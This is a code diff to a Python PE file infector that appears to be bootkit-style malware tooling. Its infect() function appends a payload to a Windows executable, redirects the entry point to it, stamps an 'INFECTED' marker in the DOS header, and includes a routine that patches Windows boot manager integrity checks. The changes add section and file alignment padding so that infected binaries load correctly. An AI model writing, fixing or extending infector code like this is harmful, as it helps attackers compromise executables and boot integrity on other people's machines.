@@ -12,6 +12,9 @@ INFECTOR_CONFIG_LEN = 8 + 8 + 8 + 8 + 8
 # IMAGE_DOS_HEADER.e_res magic constant to mark infected file
 INFECTOR_SIGN = 'INFECTED'
 
+align_up = lambda x, a: ((x + a - 1) // a) * a
+align_down = lambda x, a: (x // a) * a
+
 def patch_win_boot_mgr_integrity(data):
 
     for i in range(0, len(data) - 0x100):
@@ -132,6 +135,9 @@ def infect(src, payload, dst = None, patch_integrity = False):
     # write updated _INFECTOR_CONFIG back to the payload image
     data = _infector_config_set(pe_payload, data, val_1, val_2, val_3, conf_ep_new, conf_ep_old)
 
+    # add padding
+    data += '\0' * (align_up(len(data), pe_src.OPTIONAL_HEADER.FileAlignment) - len(data))
+
     # set new entry point of target image
     pe_src.OPTIONAL_HEADER.AddressOfEntryPoint = \
         last_section.VirtualAddress + last_section.SizeOfRawData + conf_ep_new    
@@ -149,6 +155,7 @@ def infect(src, payload, dst = None, patch_integrity = False):
 
     # update image headers
     pe_src.OPTIONAL_HEADER.SizeOfImage = last_section.VirtualAddress + last_section.Misc_VirtualSize
+    pe_src.OPTIONAL_HEADER.SizeOfImage = align_up(pe_src.OPTIONAL_HEADER.SizeOfImage, pe_src.OPTIONAL_HEADER.SectionAlignment)
     pe_src.DOS_HEADER.e_res = INFECTOR_SIGN    
 
     print('New entry point RVA is 0x%.8x' % pe_src.OPTIONAL_HEADER.AddressOfEntryPoint)
